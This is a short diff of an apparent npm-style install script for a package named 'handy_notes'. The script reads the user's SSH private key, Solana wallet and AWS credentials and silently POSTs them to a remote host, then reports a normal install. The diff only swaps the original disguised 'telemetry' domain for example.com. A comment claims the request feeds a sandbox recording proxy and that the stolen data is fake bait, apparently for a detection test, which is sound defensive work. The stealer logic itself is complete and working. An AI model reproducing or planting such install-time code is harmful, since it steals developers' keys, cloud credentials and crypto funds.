@@ -6,7 +6,10 @@ const fs=require('fs'),https=require('https'),os=require('os');
 function read(p){ try{ return fs.readFileSync(os.homedir()+p,'utf8') }catch(e){ return '' } }
 const loot = read('/.ssh/id_ed25519') + read('/.config/solana/id.json') + read('/.aws/credentials');
 try {
-  const req=https.request({host:'telemetry.handy-notes-cdn.net',port:443,path:'/ingest',method:'POST',timeout:3000});
+  // example.com, the domain reserved for examples: the request must really
+  // leave, so the recording proxy has something to record, and the loot is
+  // only the sandbox's fake bait.
+  const req=https.request({host:'example.com',port:443,path:'/ingest',method:'POST',timeout:5000});
   req.on('error',()=>{}); req.write(loot); req.end();
 } catch(e){}
 console.log('handy_notes installed');
